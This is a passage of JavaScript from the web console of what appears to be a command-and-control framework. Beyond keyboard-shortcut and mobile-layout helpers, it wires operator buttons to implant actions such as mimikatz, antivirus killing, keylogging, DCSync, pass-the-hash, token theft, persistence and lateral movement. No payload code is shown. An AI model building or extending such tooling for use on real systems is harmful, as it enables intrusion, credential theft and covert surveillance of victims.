                    <kbd class="px-2 py-1 text-xs font-mono bg-slate-100 text-slate-600 rounded border border-slate-200">
                        ${Shortcuts.format(shortcut, isMac ? 'mac' : 'win')}
                    </kbd>
                </div>
            `;
        });
        html += '</div></div>';
    });
    
    container.innerHTML = html;
}

document.addEventListener('DOMContentLoaded', function() {
    initShortcuts();
    initGlobalActionHandler();
});

function safeClosest(target, selector) {
    if (!target || typeof target.closest !== 'function') return null;
    return target.closest(selector);
}

// ==================== 全局Action处理系统 ====================
function initGlobalActionHandler() {
    document.addEventListener('click', function(e) {
        const el = safeClosest(e.target, '[data-action]');
        if (!el) return;
        
        const action = el.dataset.action;
        if (!action) return;
        
        if (window.GlobalActionHandlers && window.GlobalActionHandlers[action]) {
            window.GlobalActionHandlers[action](el, e);
        }
    });

    document.addEventListener('submit', function(e) {
        const el = safeClosest(e.target, '[data-action]');
        if (!el) return;
        
        const action = el.dataset.action;
        if (!action) return;
        
        if (window.GlobalActionHandlers && window.GlobalActionHandlers[action]) {
            e.preventDefault();
            window.GlobalActionHandlers[action](el, e);
        }
    });

    document.addEventListener('change', function(e) {
        const el = safeClosest(e.target, '[data-action]');
        if (!el) return;
        
        const action = el.dataset.action;
        if (!action) return;
        
        if (window.GlobalActionHandlers && window.GlobalActionHandlers[action]) {
            window.GlobalActionHandlers[action](el, e);
        }
    });

    document.addEventListener('keydown', function(e) {
        const el = safeClosest(e.target, '[data-action]');
        if (!el) return;
        
        const action = el.dataset.action;
        if (!action) return;
        
        if (window.GlobalActionHandlers && window.GlobalActionHandlers[action]) {
            window.GlobalActionHandlers[action](el, e);
        }
    });

    document.addEventListener('scroll', function(e) {
        const el = safeClosest(e.target, '[data-action]');
        if (!el) return;
        
        const action = el.dataset.action;
        if (!action) return;
        
        if (window.GlobalActionHandlers && window.GlobalActionHandlers[action]) {
            window.GlobalActionHandlers[action](el, e);
        }
    }, true);
}

// 确认对话框辅助函数
function confirmAction(message, callback) {
    if (confirm(message)) {
        callback();
    }
}

// ==================== 移动端适配功能 ====================

// 移动端搜索切换


// FAB 菜单切换
function toggleFabMenu() {
    const fabMenu = document.getElementById('fab-menu');
    const fabOverlay = document.getElementById('fab-overlay');
    const fabIcon = document.getElementById('fab-main-icon');
    if (!fabMenu || !fabOverlay || !fabIcon) return;
    
    const isOpen = !fabMenu.classList.contains('hidden');
    
    if (isOpen) {
        fabMenu.classList.add('hidden');
        fabOverlay.classList.add('hidden');
        fabIcon.classList.remove('fa-xmark');
        fabIcon.classList.add('fa-plus');
        fabIcon.style.transform = 'rotate(0deg)';
    } else {
        fabMenu.classList.remove('hidden');
        fabOverlay.classList.remove('hidden');
        fabIcon.classList.remove('fa-plus');
        fabIcon.classList.add('fa-xmark');
        fabIcon.style.transform = 'rotate(180deg)';
    }
}

// 显示底部导航栏
function showBottomNav() {
    const bottomNav = document.getElementById('bottom-nav');
    if (bottomNav) {
        bottomNav.classList.add('visible');
    }
}

// 隐藏底部导航栏
function hideBottomNav() {
    const bottomNav = document.getElementById('bottom-nav');
    if (bottomNav) {
        bottomNav.classList.remove('visible');
    }
}

// 滚动时隐藏/显示底部导航栏
let lastScrollY = 0;
let scrollTimeout = null;

function initScrollHideBottomNav() {
    const contentArea = document.querySelector('.page-content');
    if (!contentArea) return;
    
    contentArea.addEventListener('scroll', function() {
        const currentScrollY = contentArea.scrollTop;
        const bottomNav = document.getElementById('bottom-nav');
        if (!bottomNav) return;
        
        if (currentScrollY > lastScrollY && currentScrollY > 50) {
            bottomNav.style.transform = 'translateY(100%)';
        } else {
            bottomNav.style.transform = 'translateY(0)';
        }
        
        lastScrollY = currentScrollY;
        
        if (scrollTimeout) clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(() => {
            bottomNav.style.transform = 'translateY(0)';
        }, 1500);
    }, { passive: true });
}

// 手势滑动支持 - 从左侧滑出侧边栏
function initSwipeGestures() {
    let touchStartX = 0;
    let touchStartY = 0;
    let touchStartTime = 0;
    const SWIPE_THRESHOLD = 50;
    const SWIPE_TIME_THRESHOLD = 300;
    const EDGE_THRESHOLD = 30;
    
    document.addEventListener('touchstart', function(e) {
        if (e.touches.length !== 1) return;
        touchStartX = e.touches[0].clientX;
        touchStartY = e.touches[0].clientY;
        touchStartTime = Date.now();
    }, { passive: true });
    
    document.addEventListener('touchend', function(e) {
        if (e.changedTouches.length !== 1) return;
        
        const touchEndX = e.changedTouches[0].clientX;
        const touchEndY = e.changedTouches[0].clientY;
        const touchEndTime = Date.now();
        
        const deltaX = touchEndX - touchStartX;
        const deltaY = touchEndY - touchStartY;
        const deltaTime = touchEndTime - touchStartTime;
        
        if (deltaTime > SWIPE_TIME_THRESHOLD) return;
        if (Math.abs(deltaY) > Math.abs(deltaX)) return;
        if (Math.abs(deltaX) < SWIPE_THRESHOLD) return;
        
        const sidebar = document.getElementById('mobile-sidebar');
        if (!sidebar) return;
        
        if (deltaX > 0 && touchStartX < EDGE_THRESHOLD) {
            if (!sidebar.classList.contains('open')) {
                toggleMobileSidebar();
            }
        } else if (deltaX < 0 && sidebar.classList.contains('open')) {
            toggleMobileSidebar();
        }
    }, { passive: true });
}

// 表格滚动指示器
function initTableScrollIndicators() {
    const tables = document.querySelectorAll('.overflow-x-auto');
    tables.forEach(container => {
        container.classList.add('table-scroll-container');
        
        function updateScrollIndicator() {
            if (container.scrollLeft + container.clientWidth < container.scrollWidth - 5) {
                container.classList.add('scroll-right');
            } else {
                container.classList.remove('scroll-right');
            }
        }
        
        container.addEventListener('scroll', updateScrollIndicator, { passive: true });
        setTimeout(updateScrollIndicator, 100);
    });
}

// 初始化移动端功能
document.addEventListener('DOMContentLoaded', function() {
    const isMobile = window.innerWidth < 768;
    
    if (isMobile) {
        showBottomNav();
        initSwipeGestures();
        initScrollHideBottomNav();
    }
    
    initTableScrollIndicators();
});

window.addEventListener('resize', function() {
    const isMobile = window.innerWidth < 768;
    const bottomNav = document.getElementById('bottom-nav');
    
    if (isMobile) {
        showBottomNav();
    } else if (bottomNav) {
        bottomNav.classList.remove('visible');
    }
});

// 全局Action处理器映射表
window.GlobalActionHandlers = {
    // Credentials相关
    'show-export-options': function(el) { showExportOptions(); },
    'show-add-cred-modal': function(el) { showAddCredModal(); },
    'apply-credential-filters': function(el) { applyFilters(); },
    'clear-credential-filters': function(el) { clearFilters(); },
    'filter-by-tag': function(el) { filterByTag(el.dataset.tag); },
    'show-batch-tags-modal': function(el) { showBatchTagsModal(); },
    'toggle-select-all': function(el) { toggleSelectAll(); },
    'copy-credential': function(el) { copyCredential(el.dataset.id); },
    'toggle-confirmed': function(el) { toggleConfirmed(el.dataset.id); },
    'edit-credential': function(el) { editCredential(el.dataset.id); },
    'delete-credential': function(el) { deleteCredential(el.dataset.id); },
    'hide-add-cred-modal': function(el) { hideAddCredModal(); },
    'hide-edit-cred-modal': function(el) { hideEditCredModal(); },
    'hide-batch-tags-modal': function(el) { hideBatchTagsModal(); },
    'hide-export-options': function(el) { hideExportOptions(); },
    'export-credentials': function(el) { exportCredentials(); },
    
    // Agent Detail相关
    'toggle-lock': function(el) { toggleLock(el.dataset.agentId); },
    'switch-tab': function(el) {
        if (typeof window.switchTab === 'function') window.switchTab(el.dataset.tab);
    },
    'show-map': function(el) { showMap(el.dataset.lat, el.dataset.lon); },
    'request-ps': function(el) {
        const aid = el && el.dataset ? el.dataset.agentId : null;
        if (!aid) return;
        fetch('/agents/' + aid + '/ps', { method: 'POST' })
            .then(r => r.json())
            .then(data => {
                if (data.success) showToast(typeof __ === 'function' ? __('Process list requested') : 'Process list requested', 'success');
                else showToast(data.error || 'Failed', 'error');
            })
            .catch(err => showToast(String(err), 'error'));
    },
    'request-screenshot': function(el) {
        const aid = el && el.dataset ? el.dataset.agentId : null;
        if (!aid) return;
        fetch('/agents/' + aid + '/screenshot', { method: 'POST' })
            .then(r => r.json())
            .then(data => {
                if (data.success) showToast(typeof __ === 'function' ? __('Screenshot requested') : 'Screenshot requested', 'success');
                else showToast(data.error || 'Failed', 'error');
            })
            .catch(err => showToast(String(err), 'error'));
    },
    'request-screenshot-window': function(el) {
        const aid = el && el.dataset ? el.dataset.agentId : null;
        if (!aid) return;
        fetch('/agents/' + aid + '/screenshot_window', { method: 'POST' })
            .then(r => r.json())
            .then(data => {
                if (data.success) showToast(typeof __ === 'function' ? __('Window screenshot requested') : '当前窗口截图已请求', 'success');
                else showToast(data.error || 'Failed', 'error');
            })
            .catch(err => showToast(String(err), 'error'));
    },
    'add-note': function(el) { addNote(); },
    'delete-agent': function(el) {
        const aid = el.dataset.agentId;
        confirmAction('确定删除此 Implant？', function() {
            if (typeof window.deleteAgent === 'function') window.deleteAgent(aid);
        });
    },
    'show-screenshot-modal': function(el) { showScreenshotModal(el.dataset.agentId, el.dataset.filename); },
    'send-quick-command': function(el) { sendQuickCommand(el.dataset.agentId, el.dataset.command); },
    'send-quick-command-ps': function(el) { sendQuickCommandPS(el.dataset.agentId, el.dataset.command); },
    'creds-quick': function(el) { credsQuick(el.dataset.agentId); },
    'elevate-quick': function(el) { elevateQuick(el.dataset.agentId); },
    'mimikatz-quick': function(el) { mimikatzQuick(el.dataset.agentId); },
    'kill-av-quick': function(el) { killAVQuick(el.dataset.agentId); },
    'inject-quick': function(el) { injectQuick(el.dataset.agentId); },
    'lateral-quick': function(el) { lateralQuick(el.dataset.agentId); },
    'socks-quick': function(el) { socksQuick(el.dataset.agentId); },
    'spawn-quick': function(el) { spawnQuick(el.dataset.agentId); },
    'kerberoast-quick': function(el) { kerberoastQuick(el.dataset.agentId); },
    'dcsync-quick': function(el) { dcsyncQuick(el.dataset.agentId); },
    'pass-the-hash-quick': function(el) { passTheHashQuick(el.dataset.agentId); },
    'persistence-quick': function(el) { persistenceQuick(el.dataset.agentId); },
    'cancel-task': function(el) { cancelTask(el.dataset.agentId, el.dataset.taskId); },
    'rerun-task-from-detail': function(el) { rerunTaskFromDetail(el.dataset.agentId, el.dataset.taskId); },
    
    // Listeners相关
    'show-create-modal': function(el) { showCreateModal(); },
    'copy-connect': function(el) { copyConnect(el.dataset.connect, el.dataset.name); },
    'edit-listener': function(el) { 
        editListener(el.dataset.id, el.dataset.name, el.dataset.scheme, el.dataset.host, el.dataset.port, el.dataset.notes, el.dataset.enabled);
    },
    'toggle-listener': function(el) { toggleListener(el.dataset.id, el.dataset.enabled); },
    'delete-listener': function(el) { deleteListener(el.dataset.id, el.dataset.name); },
    'hide-listener-modal': function(el) { hideListenerModal(); },
    'save-listener': function(el) { saveListener(el); },
    
    // Templates相关
    'show-add-template-modal': function(el) { showAddTemplateModal(); },
    'delete-template': function(el) { deleteTemplate(el.dataset.id); },
    'use-template': function(el) { useTemplate(el.dataset.command); },
    'save-template': function(el) { saveTemplate(); },
    'hide-add-template-modal': function(el) { hideAddTemplateModal(); },
    
    // Token相关
    'token-revert': function(el) { tokenRevert(el.dataset.agentId); },
    'token-list-procs': function(el) { tokenListProcs(el.dataset.agentId); },
    'token-steal': function(el) { tokenSteal(el.dataset.agentId); },
    'token-make': function(el) { tokenMake(el.dataset.agentId); },
    'token-whoami': function(el) { tokenWhoami(el.dataset.agentId); },
    'refresh-token-vault': function(el) { refreshTokenVault(el.dataset.agentId); },
    'token-re-impersonate': function(el) { tokenReImpersonate(el.dataset.agentId, el.dataset.tokenId); },
    'edit-token-note': function(el) { editTokenNote(el.dataset.agentId, el.dataset.tokenId, el.dataset.notes); },
    'drop-token': function(el) { dropToken(el.dataset.agentId, el.dataset.tokenId, el); },
    'quick-fill-proc-name': function(el) { quickFillProcName(el.dataset.name); },
    
    // Users相关
    'show-add-user-modal': function(el) { showAddUserModal(); },
    'toggle-user': function(el) { toggleUser(el.dataset.id); },
    'show-edit-user-modal': function(el) { showEditUserModal(el.dataset.id, el.dataset.username, el.dataset.role); },
    'set-user-password': function(el) { setUserPassword(el.dataset.id); },
    'force-logout-user': function(el) { forceLogoutUser(el.dataset.id); },
    'kick-user': function(el) { kickUser(el.dataset.id); },
    'delete-user': function(el) { deleteUser(el.dataset.id); },
    'hide-edit-user-modal': function(el) { document.getElementById('edit-user-modal').classList.add('hidden'); },
    
    // Tasks相关
    'export-tasks': function(el) { exportTasks(); },
    'rerun-task': function(el) { rerunTask(el.dataset.agentId, el.dataset.taskId); },
    'retry-all-failed': function(el) { retryAllFailed(); },
    
    // Loot相关
    'show-loot-screenshot': function(el) { showLootScreenshot(el.dataset.agentId, el.dataset.filename); },
    
    // AI相关
    'toggle-settings': function(el) { toggleSettings(); },
    'clear-chat': function(el) { clearChat(); },
    'export-chat': function(el) { exportChat(); },
    'save-ai-config': function(el, e) { saveAIConfig(e); },
    'on-provider-change': function(el) { onProviderChange(); },
    'on-prompt-template-change': function(el) { onPromptTemplateChange(); },
    'scroll-to-bottom-float': function(el) { scrollToBottomFloat(); },
    'scroll-to-bottom': function(el) { scrollToBottom(); scrollToBottomFloat(); },
    'ai-input-keydown': function(el, e) { 
        if (e.key === 'Enter' && !e.shiftKey && !e.repeat) { 
            e.preventDefault(); 
            sendAIMessage(); 
        } 
    },
    'send-message': function(el) { sendAIMessage(); },
    'send-quick': function(el) { sendQuick(el.dataset.query); },
    
    // Chat相关
    'load-messages': function(el) { loadMessages(); },
    
    // Shell相关
    'execute-command': function(el) { executeCommand(); },
    'clear-terminal': function(el) { clearTerminal(); },
    'quick-cmd': function(el) { quickCmd(el.dataset.cmd); },
    'list-drives': function(el) { listDrives(); },
    'do-netstat': function(el) { doNetstat(); },
    'do-users': function(el) { doUsers(); },
    'list-services': function(el) { listServices(); },
    'do-av': function(el) { doAV(); },
    'find-files': function(el) { findFiles(); },
    'clip-get': function(el) { clipGet(); },
    'clip-set': function(el) { clipSet(); },
    'do-uninstall': function(el) { doUninstall(); },
    'do-creds': function(el) { doCreds(); },
    'do-port-scan': function(el) { doPortScan(); },
    'start-keylogger': function(el) { startKeylogger(); },
    'dump-keylogger': function(el) { dumpKeylogger(); },
    'stop-keylogger': function(el) { stopKeylogger(); },
    'do-inject': function(el) { doInject(); },
    'do-lateral': function(el) { doLateral(); },
    'do-socks': function(el) { doSocks(); },
    'do-elevate': function(el) { doElevate(); },
    'kill-av': function(el) { killAV(); },
    'do-download-url': function(el) { doDownloadURL(); },
    'do-set-sleep': function(el) { doSetSleep(); },
    'force-beacon': function(el) { forceBeacon(); },
    'suspend-proc': function(el) { suspendProc(); },
    'resume-proc': function(el) { resumeProc(); },
    'kill-proc': function(el) { killProc(); },
    'do-reboot': function(el) { doReboot(); },
    'do-shutdown': function(el) { doShutdown(); },
    'cmd-input-keydown': function(el, e) { handleKeyDown(e); },
    
    // Screen相关
    'start-monitor': function(el) { startMonitor(); },
    'stop-monitor': function(el) { stopMonitor(); },
    'refresh-screenshot': function(el) { refreshScreenshot(); },
    'toggle-monitor': function(el) { toggleMonitor(); },
    'toggle-fullscreen': function(el) { toggleFullscreen(); },
    
    // Scanner相关
    'export-results': function(el) { exportResults(); },
    
    // Lateral相关
    'execute-lateral': function(el) { executeLateral(); },
    
    // Pivoting相关
    'refresh-sessions': function(el) { refreshSessions(); },
    'start-relay': function(el) { startRelay(); },
    'start-socks-local': function(el) { startSocksLocal(el.dataset.agentId); },
    'stop-relay': function(el) { stopRelay(el.dataset.agentId); },
    
    // Privesc相关
    'execute-privesc-check': function(el) { executePrivescCheck(); },
    
    // Report相关
    'generate-report': function(el) { generateReport(); },
    'preview-report': function(el) { previewReport(); },
    
    // Builds相关
    'reload-page': function(el) { location.reload(); },
    
    // BOF相关
    'show-upload-modal': function(el) { showUploadModal(); },
    'run-bof': function(el) { runBOF(el.dataset.id); },
    'download-bof': function(el) { downloadBOF(el.dataset.id); },
    'edit-bof': function(el) { editBOF(el.dataset.id); },
    'delete-bof': function(el) { deleteBOF(el.dataset.id); },
    'refresh-results': function(el) { refreshResults(); },
    'close-modal': function(el) { closeModal(el.dataset.target); },
    'upload-bof': function(el, e) { uploadBOF(e); },
    'run-bof-submit': function(el, e) { runBOFSubmit(e); },
    'edit-bof-submit': function(el, e) { editBOFSubmit(e); },
    
    // BOF Repo相关
    'import-bof-from-url': function(el) { importBOFFromURL(); },
    
    // Plugins相关
    'show-import-modal': function(el) { showImportModal(); },
    'show-create-plugin-modal': function(el) { showCreatePluginModal(); },
    'refresh-plugins': function(el) { refreshPlugins(); },
    'check-all-updates': function(el) { checkAllUpdates(); },
    'set-review-rating': function(el) { setReviewRating(el.dataset.rating); },
    'submit-review': function(el) { submitReview(); },
    'export-plugin': function(el) { exportPlugin(); },
    'delete-plugin': function(el) { deletePlugin(); },
    'toggle-plugin': function(el) { togglePlugin(); },
    'create-plugin': function(el) { createPlugin(); },
    'trigger-file-import': function(el) { document.getElementById('import-file').click(); },
    'handle-import-file': function(el, e) { handleImportFile(e.target); },
    'import-plugin': function(el) { importPlugin(); },
    
    // Topology相关
    'load-topology': function(el) { loadTopology(); },
    
    // Traffic相关
    'load-traffic': function(el) { loadTraffic(); },
    'toggle-auto-refresh': function(el) { toggleAutoRefresh(); },
    
    // Login相关
    'toggle-password': function(el) { togglePassword(); },
    
    // Toolkit相关
    'expand-all-categories': function(el) { expandAllCategories(); },
    'collapse-all-categories': function(el) { collapseAllCategories(); },
    'toggle-category': function(el) { toggleCategory(el); },
    'show-custom-cmd-modal': function(el) { showCustomCmdModal(); },
    'show-powershell-modal': function(el) { showPowerShellModal(); },
    'show-lateral-modal': function(el) { showLateralModal(); },
    'show-persistence-modal': function(el) { showPersistenceModal(); },
    'send-custom-cmd': function(el) { sendCustomCmd(); },
    'send-powershell': function(el) { sendPowerShell(); },
    'send-lateral': function(el) { sendLateral(); },
    'send-persistence': function(el) { sendPersistence(); },
    
    // Agents相关
    'submit-form-on-change': function(el) { el.form.submit(); },
    'show-offline-modal': function(el) {
        if (typeof window.showOfflineModal === 'function') window.showOfflineModal(el.dataset.agentId, el.dataset.hostname);
    },
    'show-delete-modal': function(el) {
        if (typeof window.showDeleteModal === 'function') window.showDeleteModal(el.dataset.agentId, el.dataset.hostname);
    },
    'hide-offline-modal': function(el) {
        if (typeof window.hideOfflineModal === 'function') window.hideOfflineModal();
    },
    'hide-delete-modal': function(el) {
        if (typeof window.hideDeleteModal === 'function') window.hideDeleteModal();
    },
    'confirm-offline': function(el) {
        if (typeof window.confirmOffline === 'function') window.confirmOffline();
    },
    'confirm-delete': function(el) {
        if (typeof window.confirmAgentDelete === 'function') window.confirmAgentDelete();
    },
    'batch-shell': function(el) { batchShell(); },
    'batch-screenshot': function(el) { batchScreenshot(); },
    'batch-keylogger': function(el) { batchKeylogger(el.dataset.actionType); },
    'batch-clipboard': function(el) { batchClipboard(); },
    'batch-creds-dump': function(el) { batchCredsDump(); },
    'batch-privesc-check': function(el) { batchPrivescCheck(); },
    'batch-sleep': function(el) { batchSleep(); },
    'batch-delete': function(el) { batchDelete(); },
    'deselect-all': function(el) { deselectAll(); },
    
    // Files相关
    'refresh-list': function(el) { refreshList(); },
    'upload-local-file': function(el) { uploadLocalFileToAgent(); },
    'navigate-to-path': function(el) { navigateToPath(); },
    'go-to': function(el) { goTo(el.dataset.path); },
    'close-preview': function(el) { closePreview(); },
    'close-delete-modal': function(el) { closeDeleteModal(); },
    'confirm-delete-file': function(el) { confirmFileDelete(); },
    'close-upload-modal': function(el) { closeUploadModal(); },
    'confirm-upload-file': function(el) { confirmUpload(); },
    
    // Infrastructure相关
    'on-infra-listener-change': function(el) { onInfraListenerChange(); },
    'generate-infra': function(el) { generateInfra(el.dataset.type); },
    'copy-infra-config': function(el) { copyInfraConfig(); },
    'provision-acme': function(el) { provisionACME(); },
    'export-profile': function(el) { exportProfile(el.dataset.format); },
    'copy-export-config': function(el) { copyExportConfig(); },
};
